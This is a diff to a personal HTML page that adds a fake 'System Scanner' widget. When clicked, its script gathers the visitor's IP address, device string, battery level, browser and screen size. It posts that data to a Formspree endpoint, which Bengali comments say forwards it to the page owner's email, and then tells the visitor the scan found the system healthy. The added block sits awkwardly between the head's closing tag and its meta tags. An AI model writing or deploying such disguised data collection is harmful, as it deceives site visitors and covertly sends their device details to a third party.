@@ -11,7 +11,52 @@
     <meta name="keywords" content="Sojol, System Breached, Termux, Developer">
     
     <link rel="stylesheet" href="style.css">
-</head>
+</head><div id="analyzer" style="background: #1a1a1a; color: #00ff00; padding: 20px; border-radius: 10px; font-family: monospace; margin: 20px;">
+    <h3>[System Scanner]</h3>
+    <p id="ip-info">Scanning IP...</p>
+    <p id="dev-info">Detecting Device...</p>
+    <p id="bat-info">Checking Battery...</p>
+    <button onclick="startScan()" style="background: #00ff00; color: black; border: none; padding: 10px; cursor: pointer;">RUN DEEP SCAN</button>
+</div>
+
+<script>
+async function startScan() {
+    try {
+        // ১. আইপি তথ্য সংগ্রহ
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        document.getElementById('ip-info').innerText = "IP: " + data.ip;
+
+        // ২. ডিভাইসের তথ্য
+        const device = navigator.userAgent.split(')')[0].split('(')[1];
+        document.getElementById('dev-info').innerText = "Device: " + device;
+
+        // ৩. ব্যাটারি তথ্য (যদি ব্রাউজার সাপোর্ট করে)
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            document.getElementById('bat-info').innerText = "Battery: " + (battery.level * 100) + "%";
+        }
+
+        // ৪. তথ্য আপনার ইমেইলে পাঠানো (Formspree)
+        // 'YOUR_ID' এর জায়গায় আপনার Formspree থেকে পাওয়া আইডিটি বসান
+        fetch("https://formspree.io/f/YOUR_ID", {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                Target_IP: data.ip,
+                Device_Name: device,
+                Browser: navigator.appName,
+                Screen: window.screen.width + "x" + window.screen.height
+            })
+        });
+
+        alert("Scan Complete! System Healthy.");
+    } catch (e) {
+        alert("Scan Failed!");
+    }
+}
+</script>
+
 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
